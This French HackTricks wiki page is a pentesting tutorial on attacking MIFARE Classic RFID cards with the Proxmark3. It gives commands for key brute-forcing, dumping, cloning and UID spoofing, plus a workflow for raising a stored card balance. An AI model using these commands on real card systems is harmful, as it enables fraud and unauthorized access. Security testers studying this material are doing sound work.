# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Attaquer les systèmes RFID avec Proxmark3

Installez le client Proxmark3 RRG/Iceman activement maintenu ainsi que le firmware correspondant, puis vérifiez la syntaxe des commandes avec cette version, car les anciennes commandes présentées ci-dessous peuvent avoir changé.<sup>[[1]](#references)[[5]](#references)</sup>

### Attaquer MIFARE Classic 1KB

MIFARE Classic 1K possède **16 secteurs**, chacun composé de **4 blocs** de **16 octets**. Le bloc fabricant 0 contient l'UID et les données du fabricant et est en lecture seule sur les cartes NXP authentiques ; certaines cartes clone ou « magic » peuvent permettre sa réécriture.<sup>[[1]](#references)[[2]](#references)</sup>\
Pour accéder à chaque secteur, vous avez besoin de **2 clés** (**A** et **B**), qui sont stockées dans le **bloc 3 de chaque secteur** (sector trailer). Le sector trailer stocke également les **bits d'accès** qui définissent les permissions de **lecture et d'écriture** sur **chaque bloc** à l'aide des 2 clés.\
2 clés sont utiles pour accorder les permissions de lecture si vous connaissez la première et d'écriture si vous connaissez la seconde, par exemple.

Plusieurs attaques peuvent être effectuées
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Le Proxmark3 permet d’effectuer d’autres actions, comme l’**eavesdropping** d’une **communication Tag vers Reader**, afin d’essayer de trouver des données sensibles. Dans ce cas, vous pouvez simplement sniffer la communication et calculer la clé utilisée, car les **opérations cryptographiques utilisées sont faibles** et, en connaissant le texte en clair et le texte chiffré, vous pouvez la calculer (outil `mfkey64`).<sup>[[3]](#references)</sup>

#### Workflow rapide MiFare Classic pour l’abus de valeurs stockées

Lorsque les terminaux stockent les soldes sur des cartes Classic, un flux typique de bout en bout est le suivant :<sup>[[4]](#references)</sup>
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
Notes

- `hf mf autopwn` orchestre des attaques de type nested/darkside/HardNested, récupère les clés et crée des dumps dans le dossier de dumps du client.<sup>[[1]](#references)</sup>
- L'écriture du bloc 0/UID ne fonctionne que sur les cartes magic gen1a/gen2. Les cartes Classic normales ont un UID en lecture seule.<sup>[[2]](#references)</sup>
- De nombreux déploiements utilisent des « value blocks » Classic ou de simples checksums. Vérifiez que tous les champs dupliqués/complémentés et les checksums restent cohérents après modification.<sup>[[4]](#references)</sup>

Consultez une méthodologie de niveau supérieur et les mesures d'atténuation dans :

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Commandes brutes

Les systèmes IoT utilisent parfois des **tags sans marque ou non commerciaux**. Dans ce cas, vous pouvez utiliser Proxmark3 pour envoyer des **commandes brutes personnalisées aux tags**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quitting Search
```
Avec ces informations, vous pouvez essayer de rechercher des informations sur la carte et sur la manière de communiquer avec celle-ci. Proxmark3 permet d'envoyer des commandes brutes comme : `hf 14a raw -p -b 7 26`

### Scripts

Le logiciel Proxmark3 est fourni avec une liste préchargée de **scripts d'automatisation** que vous pouvez utiliser pour effectuer des tâches simples. Pour récupérer la liste complète, utilisez la commande `script list`. Ensuite, utilisez la commande `script run`, suivie du nom du script :
```
proxmark3> script run mfkeys
```
Vous pouvez créer un script pour **fuzz les lecteurs de tags**. Ainsi, en copiant les données d'une **carte valide**, il suffit d'écrire un **script Lua** qui **randomise** un ou plusieurs **octets** et de vérifier si le **lecteur plante** lors d'une itération.

## References

- [1] [Wiki Proxmark3 : HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Wiki Proxmark3 : cartes HF Magic](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [Déclaration de NXP sur Crypto1 de MIFARE Classic](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [Exploitation de la vulnérabilité des cartes NFC dans KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [Proxmark3 de RRG/Iceman — installation sous Linux](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
{{#include ../../banners/hacktricks-training.md}}
